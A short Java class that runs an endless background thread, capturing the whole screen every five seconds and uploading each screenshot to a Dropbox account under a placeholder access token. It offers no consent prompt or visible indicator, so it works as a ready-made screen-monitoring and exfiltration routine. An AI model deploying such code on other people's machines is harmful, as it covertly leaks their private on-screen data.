package com.screenUploader;

import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;
import com.dropbox.core.v2.files.UploadErrorException;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;

public class ThreadMain implements Runnable{
    static String ACCESS_TOKEN = "Paste your ACCESS_TOKEN here";
    Thread t;

    ThreadMain(){
        t = new Thread(this, "main Thread");
        t.start();
    }

    private static void sendTo() {
        SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd_HHmmss");
        Date now = new Date();
        String formatedData = format.format(now);

        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
        try {
            Robot robot = new Robot();
            String fileFormat = "png";
            String fileName = formatedData + "." + fileFormat;
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenFullImage = robot.createScreenCapture(screenRect);

            ByteArrayOutputStream os = new ByteArrayOutputStream();
            ImageIO.write(screenFullImage, fileFormat, os);
            InputStream is = new ByteArrayInputStream(os.toByteArray());

            FileMetadata metadata = client.files().uploadBuilder("/" + fileName).uploadAndFinish(is);

        } catch (Exception e) {
            System.out.println("Lol " + e);
    }}
    @Override
    public void run() {
        while (true){
            try{
                sendTo();
                Thread.sleep(5000);
            } catch (Exception e){
                System.out.println("Exception " + e);
            }
        }
    }
}
